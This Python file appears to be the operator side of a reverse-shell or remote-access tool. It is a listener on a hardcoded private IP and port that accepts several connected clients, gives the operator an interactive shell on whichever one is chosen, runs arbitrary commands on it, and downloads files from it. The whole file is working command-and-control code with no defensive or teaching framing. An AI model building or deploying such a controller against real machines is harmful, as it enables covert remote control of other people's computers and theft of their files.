import socket
import select

from utils import receive_file


def which_client_to_interact(clients):
    print("Connected clients:")
    for i, (client_socket, address, client_id) in enumerate(clients):
        print(f"{i + 1} - {address} (Client ID: {client_id})")

    index = int(input("Enter the number you want to interact: "))
    if index == 0:
        return None, None
    conn, addr, client_id = clients[index - 1]
    print(f"Connected with {client_id}")
    return conn, addr


def handle_client_interaction(conn: socket.socket, addr):
    # with conn:
    print(f"Connected by {addr}")

    try:
        while True:
            cwd = conn.recv(4096).decode('utf-8')
            command = input(f"{cwd} $ ")

            if command.lower().startswith('switch'):
                conn.sendall(command.encode('utf-8'))
                return True
            elif command.lower().startswith('download'):
                _, filename = command.split(' ', 1)
                filepath = cwd + f"/{filename}"
                print(filepath)
                command = f"download {filepath}"
                conn.sendall(command.encode('utf-8'))
                receive_file(conn, f"download/{filename}")
                continue

            conn.sendall(command.encode('utf-8'))

            if command.lower() == 'exit':
                conn.close()
                return False

            response = conn.recv(4096).decode('utf-8')

            if response.split(' ')[0] == "%->":
                print(response)
                continue

            elif command.lower().startswith('cd'):
                # cwd = response
                continue

            else:
                print(response)
                continue
    except BrokenPipeError:
        print(f"Connection with {addr} broken.")
        return False
    except socket.error as e:
        print(f"Socket error with {addr}: {e}")
        return False
    except Exception as e:
        print(f"Exception with {addr}: {e}")
        return False

    finally:
        conn.close()


def start_server():
    client_id_counter = 1
    clients = []

    host = '192.168.1.107'
    port = 12344

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, port))
        server_socket.listen(5)

        print(f"Server listening on {host}:{port}")

        server_socket.setblocking(False)
        inputs = [server_socket]
        inputs = [sock for sock in inputs if sock.fileno() != -1]

        while True:
            try:
                readable, _, _ = select.select(inputs, [], [])

                for readable_socket in readable:
                    if readable_socket == server_socket:
                        client_socket, address = server_socket.accept()
                        print(f"New client connected with Client ID: {client_id_counter}")
                        clients.append((client_socket, address, client_id_counter))
                        client_id_counter += 1
                        inputs.append(client_socket)

                    else:
                        conn, addr = which_client_to_interact(clients)
                        if conn is None:
                            continue

                        while handle_client_interaction(conn, addr):
                            conn, addr = which_client_to_interact(clients)
                            if conn is None:
                                break
            except KeyboardInterrupt:
                print("Server terminated by the user.")
                break
            except Exception as e:
                print("Server Exception: ", str(e))
                break


if __name__ == "__main__":
    start_server()
